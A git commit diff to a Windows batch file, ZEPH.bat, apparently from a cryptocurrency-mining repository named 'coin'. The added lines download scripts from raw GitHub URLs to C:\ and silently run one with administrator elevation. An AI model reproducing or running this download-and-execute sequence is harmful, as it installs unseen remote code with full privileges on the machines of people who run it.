61829d3cbb9c4a6b31f7e3fccda5706f0fdc6c8d
GALVINVN <112307302+GALVINVN@users.noreply.github.com>
2025-01-05 19:04:24 +0700

    ZEPH.bat

--- ZEPH.bat
+++ ZEPH.bat
@@ -1,1 +1,4 @@
 powershell.exe Invoke-WebRequest -Uri "https://raw.githubusercontent.com/GALVINVN/coin/refs/heads/main/configure_system.ps1" -OutFile "C:\configure_system.ps1"
+powershell.exe Invoke-WebRequest -Uri "https://raw.githubusercontent.com/GALVINVN/coin/refs/heads/main/RUNSYS.bat" -OutFile "C:\RUNSYS.bat"
+powershell.exe Start-Process -FilePath "C:\RUNSYS.bat" -ArgumentList "/S" -Verb RunAs
+
